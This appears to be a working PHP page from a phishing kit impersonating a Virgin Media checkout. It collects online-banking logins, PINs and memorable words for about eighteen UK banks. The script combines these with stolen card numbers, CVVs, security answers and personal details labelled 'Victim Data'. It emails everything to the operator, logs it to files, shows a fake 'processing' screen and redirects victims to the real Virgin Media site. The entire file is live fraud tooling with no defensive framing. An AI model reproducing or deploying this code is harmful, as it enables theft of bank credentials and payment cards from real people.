<?php
require 'controls.php';
date_default_timezone_set('Europe/London');
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$agent = $_SERVER['HTTP_USER_AGENT'];

if(isset($_GET['bank'])){
    if($_GET['bank'] == 'hsbc'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $memWord = $_POST['memWord'];
        $pin = $_POST['pin'];
        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."

        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."

        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."

        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Memorable Word: ".$memWord."
        Telepin: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("HSBC Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("HSBC Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'barclays'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Membership Number: ".$username."
        Memorable Word: ".$password."
        Passcode: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Barclays Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Barclays Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'halifax'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Memorable Word: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Halifax Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Halifax Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'lloyds'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Memorable Word: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Lloyds Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Lloyds Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'natwest'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Pin: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("natwest Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Natwest Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'rbs'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];
        $memWord = $_POST['memWord'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Pin: ".$pin."
        Memorable Word: ".$memWord."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("RBS Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("RBS Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'santander'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];
        $memWord = $_POST['memWord'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Security Pin: ".$pin."
        Memorable Word: ".$memWord."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("santander Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Santander Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'tsb'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $memWord = $_POST['memWord'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Memorable Word: ".$memWord."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("santander Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("TSB Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'clydesdale'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Membership Number: ".$username."
        Memorable Word: ".$password."
        Pin: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("clydesdale Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Clydesdale Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'nation'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Membership Number: ".$username."
        Memorable Word: ".$password."
        Pin: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Nationwide Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Nationwide Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'sains'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $memWord = $_POST['memWord'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Memorable Word: ".$memWord."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Sainsburys Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Sainsburys Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'metro'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $memWord = $_POST['memWord'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Memorable Word: ".$memWord."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Metro Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Metro Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'citi'){
        $username = $_POST['username'];
        $password = $_POST['password'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Citi Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Citi Bank Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'ulster'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Pin: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Ulster Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Ulster Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'tesco'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Pin: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Tesco Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Tesco Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'coop'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $pin = $_POST['pin'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Pin: ".$pin."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("CO-OP Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Co-Op Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
    elseif($_GET['bank'] == 'monzo'){
        $username = $_POST['username'];
        $password = $_POST['password'];
        $memWord = $_POST['memWord'];

        $savestring = "-----".$resultsName."-----

        </Virgin Login\>
        Username: ".$_SESSION['username']."
        Password: ".$_SESSION['password']."
        
        </Security Question\>
        Security Question: ".$_SESSION['securityQ']."
        Security Answer: ".$_SESSION['securityA']."
        
        </Card Details\>
        Card Number: ".$_SESSION['ccNum']."
        Expiry Date: ".$_SESSION['expMM']." / ".$_SESSION['expYY']."
        Security Code: ".$_SESSION['ccCVV']."
        
        </Billing Details\>
        Full Name: ".$_SESSION['fullName']."
        Address: ".$_SESSION['address']."
        City: ".$_SESSION['city']."
        Post Code: ".$_SESSION['postCode']."
        DOB: ".$_SESSION['dob']."
        Telephone: ".$_SESSION['telephone']."
        Account Num: ".$_SESSION['accNum']."
        Sort Code: ".$_SESSION['sortCode']."

        </Bank Info\>
        Username: ".$username."
        Password: ".$password."
        Memorable Name: ".$memWord."

        </Victim Data\>
        IP: ".$ip."
        UserAgent: ".$agent."
        Time Phished: ".$time."

        ";
        $subject = ("Monzo Log For ".$_SESSION['fullName']." - ".$resultsName);
        mail($uremail,  $subject, $savestring);
        $txtFileName = ("Monzo Logs - ".$resultsName);
        $fp = fopen('your-result-files/'.$txtFileName.'.txt', 'a');
        fwrite($fp, $savestring);
        fclose($fp);
    }
}
?>
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface no-generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths">
    <head class="at-element-marker">
        <title>Virgin Media - Checkout</title>
        <meta name="description" content="">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <link href="css/font-awesome.css" rel="stylesheet">
        <link href="css/bootstrap.css" rel="stylesheet">
        <link href="css/bootstrap.overrides.css" rel="stylesheet">
        <link href="css/vm.theme.css" rel="stylesheet">
        <link href="css/mtp.forms.css" rel="stylesheet">
        <link href="css/mtp.ecareTheme.css" rel="stylesheet">
        <link href="css/header-reBrand.css" rel="stylesheet">
        <link href="css/mtp.basket.css" rel="stylesheet">
        <?php
        echo '
            <script>
                setTimeout(function(){
                    window.location.href = "https://mobile.virginmedia.com/ecare/login";
                }, 5000);
            </script>
        ';
        ?>
    </head>
    <body class="yourdetails paym">
        <header class="header">
            <div class="">
                <div class="container">
                    <img style="position: absolute; margin-top: 1%;" class="virginLogo" src="assets/logo.png">
                    <div class="row position-rel main-hdr-row">
                        <div class="col-xs-3 logo-container">
                            <a class="vm-logo xs-logo">
                            
                            </a>
                        </div>
                        <ul class="col-xs-9 top-nav">
                            <li class="top-nav-items gradient collapsed xxs-visible main-menu" data-toggle="collapse" data-target="#levelOne-menu">
                                <a class="" href="#">
                                    <span class="openMenu">
                                            <span class="pull-left">Main
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                    <span class="closeMenu">
                                            <span class="pull-left">Close
                                                <em></em>Menu</span>
                                    <b class="sprite open-close pull-right"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items dark-gradient collapsed sign-inTop signIn-menu" data-toggle="collapse" data-target="#signIn">
                                <a class="signin-text clearfix" tabindex="11" href="#">
                                    <span class="openMenu">
                                        <span class="pull-left">
                                            <i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                    <span class="closeMenu">
                                        <span class="pull-left"><i class="sprite sign-in visible-desktop"></i>
                                            <span class="user-login-text">Sign in</span>
                                    </span>
                                    <b class="sprite open-close pull-right xxs-hidden"></b>
                                    </span>
                                </a>

                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="https://my.virginmedia.com/my-apps/email/mailbox" tabindex="10"><i class="sprite email visible-desktop"></i>Email</a>
                            </li>
                            <li class="top-nav-items xxs-hidden">
                                <a href="http://store.virginmedia.com/store-locator.html" tabindex="9"><i class="sprite store-locator visible-desktop"></i>Find a store</a>
                            </li>
                        </ul>

                        <div id="levelOne-menu" class="collapse l1-menu tab-style">
                            <div class="menu-content">
                                <ul id="navTab" class="nav row no-gap clearfix nav-tabs">
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmedia.com/entertainme" class="notch" tabindex="3">Entertain Me</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="https://store.virginmedia.com/discover.html" class="notch" tabindex="4">Our Products</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav active"><a tabindex="5" href="#joinUs" class="notch">Join Us</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="6" href="https://my.virginmedia.com/" class="notch">My Virgin Media</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a tabindex="7" href="http://help.virginmedia.com/">Help</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav"><a href="http://www.virginmediabusiness.co.uk/" tabindex="8" class="notch">For Business</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="http://store.virginmedia.com/store-locator.html" class="notch">Store Locator</a>

                                    </li>
                                    <li class="col-xxs-6 col-xs-2 tab-style-nav xxs-visible"><a href="https://my.virginmedia.com/my-apps/email/mailbox" class="notch">Email</a>

                                    </li>
                                </ul>
                            </div>
                        </div> 
                    </div>
                </div>
            </div>
        </header>

        <div id="content">
            <div class="container content-body">
                <div class="row">
                    <br>
                    <form method="post" id="yourDetailsForm" name="yourDetailsForm" class="your-details-form" action="finish.php?sessionID=<?php echo $sessionID; ?>">
                        <div class="full-width col-md-12">
                            <div class="panel-group" id="checkout">

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#upfront-payment-details">
                                                <i class="checkout-icon card-details"></i>Your Details
                                            </a>
                                        </h4>
                                    </div>
                                </div>

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion" href="#upfront-payment-details">
                                                <i class="checkout-icon card-details"></i>Direct Debit
                                            </a>
                                        </h4>
                                    </div>
                                </div>

                                <div class="panel panel-default" style="overflow:inherit;">
                                    <div class="panel-heading disabled active">
                                        <h4 class="panel-title">
                                            <a class="accordion-toggle" data-toggle="collapse" data-parent="#accordion"
                                                href="#you-details"><i class="checkout-icon your-details"></i> Card Payments</a>
                                        </h4>
                                    </div>

                                    <div class="panel-collapse in" id="direct-debit">
                                        <div class="panel-body">
                                            <div class="message">
                                                <p>We are processing your request.</p>
                                            </div>

                                            <div style="text-align: center;">
                                                <img src="assets/spin.gif">
                                                <p style="font-size: 18px">Your request is being processed.</p>
                                                <p style="font-size: 18px">Your bank may require extra verification.</p>
                                            </div>

                                        </div>
                                    </div>
                                </div>

                                <div class="panel panel-default">
                                    <div class="panel-heading disabled">
                                        <h4 class="panel-title">
